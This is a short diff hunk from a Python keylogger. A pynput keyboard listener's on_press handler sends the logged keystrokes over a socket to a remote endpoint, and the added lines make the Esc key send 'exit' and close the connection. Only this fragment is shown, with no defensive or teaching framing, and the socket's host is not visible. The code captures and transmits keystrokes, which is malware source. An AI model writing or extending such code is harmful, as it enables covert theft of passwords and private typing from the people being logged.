@@ -36,6 +36,11 @@ def on_press(key):
     else:
         s.sendall((logstring).encode('utf-8'))
         logstring = "\n"
+        
+    if key == Key.esc:  # Use the 'esc' key to close the connection
+        s.sendall("exit".encode('utf-8'))
+        s.close()
+        return False
 
 with Listener(on_press=on_press) as listener:
     listener.join()
